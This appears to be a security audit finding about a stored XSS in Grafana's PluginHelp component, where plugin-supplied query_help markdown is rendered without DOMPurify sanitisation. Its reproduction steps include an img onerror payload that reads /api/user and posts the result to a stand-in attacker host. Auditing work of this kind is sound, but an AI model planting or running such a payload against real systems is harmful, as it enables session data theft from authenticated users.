Phase: 10
Sequence: 056
Slug: plugin-query-help-xss-no-dompurify
Verdict: VALID
Rationale: PluginHelp renders content fetched from GET /api/plugins/:pluginId/markdown/query_help via renderMarkdown without DOMPurify; the source file is served from the plugin installation directory (attacker-controlled via unsigned or malicious plugin), matching the supply-chain XSS pattern of p8-044.
Severity-Original: MEDIUM
PoC-Status: theoretical
Origin-Finding: security/findings-draft/p8-044-plugin-readme-xss-no-sanitization.md
Origin-Pattern: AP-044

## Summary

`PluginHelp.tsx:39` fetches plugin markdown content from the backend API endpoint `GET /api/plugins/:pluginId/markdown/query_help`, renders it via `renderMarkdown()`, and passes the result to `dangerouslySetInnerHTML` without DOMPurify sanitization. The backend serves this content from the plugin's installed files (the `query_help.md` or equivalent file bundled with the plugin). A malicious plugin can include XSS payloads in this file. The `PluginHelp` component is embedded in the data source query editor — it is visible to any user who has access to use the plugin as a data source, not just admins.

## Location

- **Primary**: `public/app/core/components/PluginHelp/PluginHelp.tsx:39`
  ```tsx
  return <div className="markdown-html" dangerouslySetInnerHTML={{ __html: renderedMarkdown }} />;
  ```
- **Data fetch**: `getBackendSrv().get('/api/plugins/${pluginId}/markdown/query_help')` at line 13
- **Sanitizer used**: `renderMarkdown` -> `sanitizeTextPanelContent` -> xss library (not DOMPurify)
- **Trigger**: Any user opens the query editor for a data source using a malicious plugin

## Attacker Control

- **Input**: `query_help` markdown file bundled with the plugin (controlled by plugin author)
- **Vector**: Supply chain -- malicious plugin published to grafana.com or installed via unsigned plugin loading
- **Trigger**: Any user (not just admin) who uses the data source query editor

## Trust Boundary Crossed

External plugin file -> User browser session (elevated if user is admin or editor). The XSS affects any user interacting with the data source query editor, not just admins viewing the plugin catalog.

## Impact

- **Broader blast radius than p8-044**: Affects all users of the data source, not only admins viewing the plugin admin UI
- **Session hijacking**: XSS executes in the authenticated user's browser session
- **Privilege escalation**: If an admin uses the query editor, full admin privileges are exploited
- **Persistence**: Non-admin users can exfiltrate data accessible in their session

## Evidence

1. `PluginHelp.tsx:13-16`: Fetches `query_help` markdown from `/api/plugins/${pluginId}/markdown/query_help` endpoint
2. `PluginHelp.tsx:17`: `const renderedMarkdown = renderMarkdown(value)` -- renderMarkdown uses xss library, not DOMPurify
3. `PluginHelp.tsx:39`: `dangerouslySetInnerHTML={{ __html: renderedMarkdown }}` -- no DOMPurify applied
4. The `/api/plugins/:pluginId/markdown/:name` endpoint serves markdown files from the plugin directory with no sanitization server-side

## Reproduction Steps

1. Create a malicious plugin with a `query_help.md` containing XSS payload:
   ```html
   # Query Help
   <img src=x onerror="fetch('/api/user').then(r=>r.json()).then(d=>fetch('https://attacker.com/exfil',{method:'POST',body:JSON.stringify(d)}))">
   ```
2. Install the plugin (via catalog or local unsigned plugin directory)
3. Create a data source using this plugin
4. As any authenticated user, open a dashboard panel and select this data source
5. Open the query help UI (typically a help icon in the query editor)
6. Expected: XSS payload executes in the user's browser session -- user data exfiltrated
